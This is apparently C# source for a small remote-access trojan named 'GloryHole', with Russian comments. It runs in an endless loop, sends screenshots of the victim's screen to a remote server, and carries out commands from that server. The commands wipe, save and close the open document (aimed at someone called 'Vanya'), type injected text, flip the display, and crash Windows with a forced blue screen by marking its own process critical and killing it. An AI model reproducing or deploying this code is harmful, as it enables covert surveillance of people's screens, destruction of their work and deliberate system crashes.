using System;
using System.Collections.Generic;
using System.IO;
using System.Net;

using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using Newtonsoft.Json;
using System.Windows.Forms;
using API;
using System.Diagnostics;
using System.Drawing.Imaging;
using System.Linq;

namespace GloryHole
{
    class Program
    {

        ///Импортирование user32.dll для скриншотов
        [DllImport("user32.dll")]
        public static extern void keybd_event(byte vk, byte scan, int flags, int extrainfo);
        ///Импортирование ntdll.dll для BSOD
        [DllImport("ntdll.dll")]
        private static extern int NtSetInformationProcess(IntPtr process, int process_class, ref int process_value, int length);
        ///Импортирование USER32.DLL для использования вводы с клавиатуры
        [DllImport("USER32.DLL", CharSet = CharSet.Unicode)]
        public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);


        static async Task Main(string[] args)
        {
            Room room = new Room(Environment.MachineName);

            while (true)
            {
                if (room.isOnline)
                    try
                    {
                        await room.sendScreen(getScreenShot());
                        foreach (Command cmd in room.commands)
                        {
                            switch ((CommandTypes)cmd.type)
                            {
                                case (CommandTypes.AntiVanya): /*Ели косанда анти ваня */
                                    helloVania();
                                    break;
                                case (CommandTypes.Cursor): /*Ели курсор поменять нада */
                                    break;
                                case (CommandTypes.SwapScreen):/*Ели нада экран перевернуть */
                                    swap();
                                    break;
                                case (CommandTypes.WriteText):/*Ели текс нада написать */
                                    WriteText(cmd.text);
                                    break;
                                case (CommandTypes.BSOD):/*Бдос вызвать нада */
                                    BSOD();
                                    break;
                            }
                        }
                    }
                    catch(Exception e) 
                    {
                        #if DEBUG
                            Console.WriteLine(e.Message);
                        #endif
                    }
                Thread.Sleep(500);
            }
        }

        /// <summary>
        /// Чистит, сохраняет и закрывает документ
        /// </summary>
        public static void helloVania()
        {
            SendKeys.SendWait("^{a}");
            SendKeys.SendWait("{DEL}");
            SendKeys.SendWait("^{s}");
            SendKeys.SendWait("%{F4}");
        }


        /// <summary>
        /// Синий экран смерти
        /// </summary>
        public static void BSOD()
        {
            Process.EnterDebugMode();
            int status = 1;
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref status, sizeof(int));
            Process.GetCurrentProcess().Kill();
        }



        static MemoryStream getScreenShot()
        {

            string id = Environment.MachineName;
            var ms = new MemoryStream();
            Graphics graph = null;
            Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            graph = Graphics.FromImage(bmp);
            graph.CopyFromScreen(0, 0, 0, 0, bmp.Size);
            bmp = ResizeBitmap(bmp, 1600, 900);
            bmp.Save(ms, ImageFormat.Jpeg);
            string base64 = Convert.ToBase64String(ms.GetBuffer());//это комментарий
            return (ms);

        }

        public static Bitmap ResizeBitmap(Bitmap bmp, int width, int height)
        {
            Bitmap result = new Bitmap(width, height);
            using (Graphics g = Graphics.FromImage(result))
            {
                g.DrawImage(bmp, 0, 0, width, height);
            }

            return result;
        }

    }
}
